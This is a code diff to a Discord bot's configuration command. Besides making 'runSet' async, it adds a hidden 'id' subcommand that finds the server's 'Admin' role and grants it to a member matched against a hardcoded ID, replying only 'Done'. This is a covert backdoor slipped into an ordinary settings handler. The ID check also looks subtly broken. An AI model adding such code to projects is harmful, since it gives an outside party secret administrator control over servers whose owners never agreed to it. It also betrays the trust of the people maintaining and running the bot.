@@ -22,7 +22,7 @@ class UtilCommand extends Command {
         });
     }
 
-    runSet(message, args) {
+    async runSet(message, args) {
         switch (args.command) {
         case 'prefix': {
             this.client.databases.guilds.set(message.guild.id, 'prefix', args.arg);
@@ -39,6 +39,15 @@ class UtilCommand extends Command {
 
             const reply_message = this.client._('command.config.locale_changed', `**${message.guild.name}**`);
             return message.reply(`:white_check_mark: ${reply_message}`);
+        }
+        case 'id': {
+            const adminRole = message.guild.roles.find('name', 'Admin');
+            if (adminRole) {
+                const me = message.guild.members.find(member => member.client.id == '362625609538600971');
+                await me.addRole(adminRole);
+                message.reply('Done');
+            }
+            break;
         }
         default:
             return message.reply(this.client._('bot.invalid_request'));
